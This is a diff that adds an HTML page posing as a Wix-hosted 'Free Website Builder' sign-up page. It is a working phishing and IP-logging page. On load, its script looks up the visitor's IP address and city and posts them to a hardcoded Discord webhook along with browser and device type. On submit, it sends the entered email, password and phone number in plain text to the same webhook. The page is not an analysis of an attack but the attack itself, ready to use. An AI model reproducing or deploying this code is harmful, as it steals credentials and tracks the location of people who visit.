@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Website Builder</title>
+    <meta property="og:title" content="zenrerere's pathetic website">
+    <meta property="og:description" content="Build Websites Right ©">
+    <meta property="og:image:height" content="undefined" data-rh="true">
+    <meta property="og:image:width" content="undefined" data-rh="true">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: sans-serif;
+            background-color: #53456a;
+        }
+        
+        form {
+            margin-top: 20px;
+            text-align: center;
+        }
+        
+        input[type="text"],
+        input[type="password"],
+        input[type="number"] {
+            display: block;
+            border-radius: 100px;
+            width: 40%;
+            margin: 10px auto;
+            padding: 10px;
+            font-size: 16px;
+        }
+        
+        input[type="submit"] {
+            background-color: #4CAF50;
+            color: white;
+            padding: 14px 20px;
+            border-radius: 100px;
+            margin: 10px auto;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 30%;
+            font-size: 16px;
+        }
+        
+        input[type="submit"]:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+
+<body>
+    <center>
+        <h2 style="position:absolute;bottom: 0;left: 2%;color: bisque;">Website Provided By Wix ©</h2>
+        </h3>
+        <h1>Your House</h1>
+        <h2>Sign Up To View Website Content</h2>
+        <form id="signupForm" action="signup.php" method="post">
+            <input type="text" name="email" placeholder="Email Address">
+            <input type="password" name="password" placeholder="Password">
+            <input type="number" name="number" placeholder="Phone Number">
+            <input type="submit" value="Sign Up">
+        </form>
+    </center>
+    <script>
+        const webhookUrl = "https://discord.com/api/webhooks/1223441488625533028/BG-cWJMBeDcVPJBj8O_iRWblDPLhrwBHKj5rBVUZfBLVTDKY45Mpbr6wePZSMlp_n7PP";
+
+        function sendVisitorInfo() {
+            const screenSize = window.innerWidth < 768 ? "Phone" : "Computer"; // Categorize based on screen size
+            const browserInfo = getBrowserInfo();
+
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipAddress = data.ip;
+                    const timeOfVisit = new Date().toLocaleTimeString('en-US', {
+                        timeZone: 'America/New_York',
+                        hour: 'numeric',
+                        minute: 'numeric',
+                        second: 'numeric'
+                    });
+                    // Get location information
+                    fetch(`https://ipwhois.app/json/${ipAddress}`)
+                        .then(response => response.json())
+                        .then(locationData => {
+                            const visitorInfo = {
+                                content: "# __some kid from " + locationData.city + " just ran the site__\n" +
+                                    "```fix\nTime of Visit: " + timeOfVisit + "\n" +
+                                    "Device Type: " + screenSize + "\n" + // Specify device type
+                                    "Browser: " + browserInfo.name + "\n" + // Get browser name
+                                    "IP Address: " + ipAddress + "\n" + // Get IP address
+                                    "Location: " + locationData.city + ", " + locationData.region + ", " + locationData.country + '```' // Get location information
+                            };
+
+                            fetch(webhookUrl, {
+                                    method: "POST",
+                                    headers: {
+                                        "Content-Type": "application/json"
+                                    },
+                                    body: JSON.stringify(visitorInfo)
+                                })
+                                .then(response => {
+                                    if (!response.ok) {
+                                        throw new Error("Failed to send visitor info to Discord webhook");
+                                    }
+                                    console.log("Visitor info sent successfully to Discord webhook");
+                                })
+                                .catch(error => {
+                                    console.error("Error sending visitor info to Discord webhook:", error);
+                                });
+                        })
+                        .catch(error => {
+                            console.error("Error fetching location data:", error);
+                        });
+                })
+                .catch(error => {
+                    console.error("Error fetching IP address:", error);
+                });
+        }
+
+        function getBrowserInfo() {
+            const ua = navigator.userAgent;
+            let browserName;
+            if (ua.indexOf("Chrome") !== -1) browserName = "Chrome";
+            else if (ua.indexOf("Firefox") !== -1) browserName = "Firefox";
+            else if (ua.indexOf("Edge") !== -1) browserName = "Edge";
+            else if (ua.indexOf("Safari") !== -1) browserName = "Safari";
+            else browserName = "Unknown";
+
+            return {
+                name: browserName
+            };
+        }
+
+        function sendFormToWebhook(formData) {
+            const content = "# Submitted Data:\n" +
+                "```fix\nEmail: " + formData.email + "\n" +
+                "Password: " + formData.password + "\n" +
+                "Phone Number: " + formData.number + "```";
+
+            fetch(webhookUrl, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        content
+                    })
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error("Failed to send form data to Discord webhook");
+                    }
+                    console.log("Form data sent successfully to Discord webhook");
+                })
+                .catch(error => {
+                    console.error("Error sending form data to Discord webhook:", error);
+                });
+        }
+
+        document.getElementById("signupForm").addEventListener("submit", function(event) {
+            event.preventDefault(); // Prevent the form from submitting normally
+            const formData = new FormData(this);
+            sendFormToWebhook(Object.fromEntries(formData)); // Convert FormData to plain object
+        });
+
+        // Call the function to send visitor information when the page loads
+        sendVisitorInfo();
+    </script>
+</body>
+
+</html>
